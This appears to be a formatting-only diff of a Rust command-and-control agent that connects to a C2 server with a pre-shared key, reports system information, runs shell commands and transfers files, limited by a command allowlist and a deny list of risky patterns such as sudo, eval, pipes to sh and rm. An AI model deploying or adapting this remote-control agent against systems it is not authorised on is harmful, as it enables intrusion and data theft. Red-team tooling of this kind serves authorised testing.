@@ -140,11 +140,7 @@ fn get_os() -> String {
         match output {
             Ok(o) => {
                 let s = String::from_utf8_lossy(&o.stdout).trim().to_string();
-                if s.is_empty() {
-                    "Linux".to_string()
-                } else {
-                    s
-                }
+                if s.is_empty() { "Linux".to_string() } else { s }
             }
             Err(_) => "Linux".to_string(),
         }
@@ -177,12 +173,8 @@ fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
                 .unwrap_or_else(|_| "?".to_string());
             Some((cwd, String::new(), 0))
         }
-        "getpid" => {
-            Some((std::process::id().to_string(), String::new(), 0))
-        }
-        "getuid" => {
-            Some((get_username(), String::new(), 0))
-        }
+        "getpid" => Some((std::process::id().to_string(), String::new(), 0)),
+        "getuid" => Some((get_username(), String::new(), 0)),
         "sysinfo" => {
             let info = SysInfo::collect();
             let output = format!(
@@ -231,7 +223,9 @@ fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
                 if let Some(home) = dirs_next::home_dir() {
                     match std::env::set_current_dir(&home) {
                         Ok(()) => Some((String::new(), String::new(), 0)),
-                        Err(e) => Some((String::new(), format!("cd: {}: {}", home.display(), e), 1)),
+                        Err(e) => {
+                            Some((String::new(), format!("cd: {}: {}", home.display(), e), 1))
+                        }
                     }
                 } else {
                     Some((String::new(), "cd: no home directory".to_string(), 1))
@@ -263,10 +257,7 @@ fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
             }
             #[cfg(windows)]
             {
-                let output = Command::new("tasklist")
-                    .arg("/FO")
-                    .arg("TABLE")
-                    .output();
+                let output = Command::new("tasklist").arg("/FO").arg("TABLE").output();
                 match output {
                     Ok(o) => {
                         let stdout = String::from_utf8_lossy(&o.stdout).to_string();
@@ -281,8 +272,10 @@ fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
             // This builtin just acknowledges
             Some((
                 "upload: waiting for file data from C2 server...\n\
-                 [agent] Use 'upload' from C2 console to send file to this agent".to_string(),
-                String::new(), 0
+                 [agent] Use 'upload' from C2 console to send file to this agent"
+                    .to_string(),
+                String::new(),
+                0,
             ))
         }
         "download" => {
@@ -310,27 +303,97 @@ fn handle_builtin(cmd: &str, args: &[&str]) -> Option<(String, String, i32)> {
 /// Only permitted commands are allowed; all others are rejected.
 const ALLOWED_COMMANDS: &[&str] = &[
     // System info (read-only)
-    "uname", "whoami", "id", "hostname", "uptime", "df", "du", "free",
-    "ps", "top", "pidof", "pgrep",
+    "uname",
+    "whoami",
+    "id",
+    "hostname",
+    "uptime",
+    "df",
+    "du",
+    "free",
+    "ps",
+    "top",
+    "pidof",
+    "pgrep",
     // File viewing (read-only)
-    "cat", "head", "tail", "less", "more", "grep", "awk", "sed", "cut",
-    "sort", "uniq", "wc", "ls", "pwd", "find",
+    "cat",
+    "head",
+    "tail",
+    "less",
+    "more",
+    "grep",
+    "awk",
+    "sed",
+    "cut",
+    "sort",
+    "uniq",
+    "wc",
+    "ls",
+    "pwd",
+    "find",
     // Network (read-only)
-    "netstat", "ss", "ip", "ifconfig", "route", "arp", "ping",
-    "traceroute", "nslookup", "dig", "host",
+    "netstat",
+    "ss",
+    "ip",
+    "ifconfig",
+    "route",
+    "arp",
+    "ping",
+    "traceroute",
+    "nslookup",
+    "dig",
+    "host",
     // Safe utilities
-    "echo", "printf", "test", "true", "false", "env", "printenv",
-    "date", "cal", "bc", "factor", "mkdir", "touch", "cp", "mv",
+    "echo",
+    "printf",
+    "test",
+    "true",
+    "false",
+    "env",
+    "printenv",
+    "date",
+    "cal",
+    "bc",
+    "factor",
+    "mkdir",
+    "touch",
+    "cp",
+    "mv",
     // Package managers (read-only queries)
-    "dpkg", "rpm", "apt", "yum", "dnf",
+    "dpkg",
+    "rpm",
+    "apt",
+    "yum",
+    "dnf",
 ];
 
 /// Patterns that indicate potentially dangerous commands even if base command is allowed.
 const SUSPICIOUS_PATTERNS: &[&str] = &[
-    "sudo ", "su ", "chmod 7", "chmod 6", "chown ", "chgrp ",
-    ">/dev/", "2>/dev/", ">>/", "| /", "& /", "eval ", "exec ",
-    "source ", "$(", "`", "|sh", "|bash", ";rm ", "; rm ",
-    "mkfs", "dd ", "fdisk", "parted", "cryptsetup",
+    "sudo ",
+    "su ",
+    "chmod 7",
+    "chmod 6",
+    "chown ",
+    "chgrp ",
+    ">/dev/",
+    "2>/dev/",
+    ">>/",
+    "| /",
+    "& /",
+    "eval ",
+    "exec ",
+    "source ",
+    "$(",
+    "`",
+    "|sh",
+    "|bash",
+    ";rm ",
+    "; rm ",
+    "mkfs",
+    "dd ",
+    "fdisk",
+    "parted",
+    "cryptsetup",
 ];
 
 /// Check if a command line is allowed per the security allowlist.
@@ -345,11 +408,19 @@ fn is_command_allowed(cmd_line: &str) -> Result<(), String> {
     let base_lower = base_cmd.to_lowercase();
 
     // Check allowlist
-    if !ALLOWED_COMMANDS.iter().any(|&c| c.eq_ignore_ascii_case(&base_lower)) {
+    if !ALLOWED_COMMANDS
+        .iter()
+        .any(|&c| c.eq_ignore_ascii_case(&base_lower))
+    {
         return Err(format!(
             "Command '{}' not in allowlist. Allowed: {}",
             base_cmd,
-            ALLOWED_COMMANDS.iter().take(8).copied().collect::<Vec<_>>().join(", ")
+            ALLOWED_COMMANDS
+                .iter()
+                .take(8)
+                .copied()
+                .collect::<Vec<_>>()
+                .join(", ")
         ));
     }
 
@@ -392,10 +463,7 @@ fn execute_command(cmd_line: &str) -> (String, String, i32) {
     // Execute via shell (allowlisted commands only)
     #[cfg(unix)]
     {
-        let output = Command::new("/bin/sh")
-            .arg("-c")
-            .arg(cmd_line)
-            .output();
+        let output = Command::new("/bin/sh").arg("-c").arg(cmd_line).output();
 
         match output {
             Ok(o) => {
@@ -410,10 +478,7 @@ fn execute_command(cmd_line: &str) -> (String, String, i32) {
 
     #[cfg(windows)]
     {
-        let output = Command::new("cmd")
-            .arg("/C")
-            .arg(cmd_line)
-            .output();
+        let output = Command::new("cmd").arg("/C").arg(cmd_line).output();
 
         match output {
             Ok(o) => {
@@ -476,7 +541,10 @@ fn base64_decode(input: &str) -> Vec<u8> {
         }
     };
 
-    let bytes: Vec<u8> = input.bytes().filter(|&b| b != b'\n' && b != b'\r' && b != b' ').collect();
+    let bytes: Vec<u8> = input
+        .bytes()
+        .filter(|&b| b != b'\n' && b != b'\r' && b != b' ')
+        .collect();
     let mut result = Vec::with_capacity(bytes.len() * 3 / 4);
 
     let chunks = bytes.chunks_exact(4);
@@ -493,8 +561,7 @@ fn base64_decode(input: &str) -> Vec<u8> {
     }
 
     if remainder.len() >= 2 {
-        let n = ((table(remainder[0]) as u32) << 18)
-            | ((table(remainder[1]) as u32) << 12);
+        let n = ((table(remainder[0]) as u32) << 18) | ((table(remainder[1]) as u32) << 12);
         result.push((n >> 16) as u8);
         if remainder.len() >= 3 && remainder[2] != b'=' {
             result.push(((n >> 8) & 0xFF) as u8);
@@ -518,7 +585,12 @@ fn read_line(reader: &mut BufReader<&TcpStream>) -> std::io::Result<String> {
     Ok(buf.trim_end_matches(&['\n', '\r'][..]).to_string())
 }
 
-fn send_output(stream: &mut TcpStream, stdout: &str, stderr: &str, exit_code: i32) -> std::io::Result<()> {
+fn send_output(
+    stream: &mut TcpStream,
+    stdout: &str,
+    stderr: &str,
+    exit_code: i32,
+) -> std::io::Result<()> {
     let stdout_b64 = base64_encode(stdout.as_bytes());
     let stderr_b64 = base64_encode(stderr.as_bytes());
 
@@ -536,16 +608,19 @@ fn run_agent(config: &AgentConfig) -> Result<(), String> {
     let addr = format!("{}:{}", config.host, config.port);
 
     // Connect to C2 server
-    let stream = TcpStream::connect(&addr)
-        .map_err(|e| format!("Failed to connect to {}: {}", addr, e))?;
+    let stream =
+        TcpStream::connect(&addr).map_err(|e| format!("Failed to connect to {}: {}", addr, e))?;
 
-    stream.set_read_timeout(Some(Duration::from_secs(30)))
+    stream
+        .set_read_timeout(Some(Duration::from_secs(30)))
         .map_err(|e| format!("Failed to set read timeout: {}", e))?;
-    stream.set_write_timeout(Some(Duration::from_secs(10)))
+    stream
+        .set_write_timeout(Some(Duration::from_secs(10)))
         .map_err(|e| format!("Failed to set write timeout: {}", e))?;
 
     // Clone stream for separate read/write handles
-    let write_stream = stream.try_clone()
+    let write_stream = stream
+        .try_clone()
         .map_err(|e| format!("Failed to clone stream: {}", e))?;
 
     let mut reader = BufReader::new(&stream);
@@ -557,12 +632,11 @@ fn run_agent(config: &AgentConfig) -> Result<(), String> {
     } else {
         format!("RCF_AGENT_V1:{}", config.psk)
     };
-    send_line(&mut writer, &greeting)
-        .map_err(|e| format!("Failed to send greeting: {}", e))?;
+    send_line(&mut writer, &greeting).map_err(|e| format!("Failed to send greeting: {}", e))?;
 
     // Read auth response
-    let response = read_line(&mut reader)
-        .map_err(|e| format!("Failed to read auth response: {}", e))?;
+    let response =
+        read_line(&mut reader).map_err(|e| format!("Failed to read auth response: {}", e))?;
 
     if response != "RCF_AUTH_SUCCESS" {
         return Err(format!("Authentication failed: {}", response));
@@ -571,10 +645,8 @@ fn run_agent(config: &AgentConfig) -> Result<(), String> {
     // Send sysinfo
     let info = SysInfo::collect();
     let sysinfo_json = serde_json::to_string(&info).unwrap_or_default();
-    send_line(&mut writer, "RCF_SYSINFO")
-        .map_err(|e| format!("Failed to send sysinfo: {}", e))?;
-    send_line(&mut writer, &sysinfo_json)
-        .map_err(|e| format!("Failed to send sysinfo: {}", e))?;
+    send_line(&mut writer, "RCF_SYSINFO").map_err(|e| format!("Failed to send sysinfo: {}", e))?;
+    send_line(&mut writer, &sysinfo_json).map_err(|e| format!("Failed to send sysinfo: {}", e))?;
     send_line(&mut writer, "RCF_SYSINFO_END")
         .map_err(|e| format!("Failed to send sysinfo: {}", e))?;
 
@@ -621,12 +693,12 @@ fn run_agent(config: &AgentConfig) -> Result<(), String> {
             let upload_result = std::fs::write(&file_path, &file_data);
 
             let (stdout, stderr, exit_code) = match upload_result {
-                Ok(()) => {
-                    (format!("Uploaded {} bytes to {}\n", file_data.len(), file_path), String::new(), 0)
-                }
-                Err(e) => {
-                    (String::new(), format!("upload: {}: {}\n", file_path, e), 1)
-                }
+                Ok(()) => (
+                    format!("Uploaded {} bytes to {}\n", file_data.len(), file_path),
+                    String::new(),
+                    0,
+                ),
+                Err(e) => (String::new(), format!("upload: {}: {}\n", file_path, e), 1),
             };
 
             if let Err(e) = send_output(&mut writer, &stdout, &stderr, exit_code) {
@@ -661,7 +733,9 @@ fn main() {
 
     // SECURITY: Require non-empty PSK before proceeding
     if config.psk.is_empty() {
-        eprintln!("[!] ERROR: PSK is required. Provide one via --psk <key> or RCF_AGENT_PSK env var.");
+        eprintln!(
+            "[!] ERROR: PSK is required. Provide one via --psk <key> or RCF_AGENT_PSK env var."
+        );
         eprintln!("[!] Generate a secure PSK: openssl rand -hex 32");
         std::process::exit(1);
     }
@@ -693,7 +767,9 @@ mod dirs_next {
         }
         #[cfg(windows)]
         {
-            std::env::var("USERPROFILE").ok().map(std::path::PathBuf::from)
+            std::env::var("USERPROFILE")
+                .ok()
+                .map(std::path::PathBuf::from)
         }
     }
 }
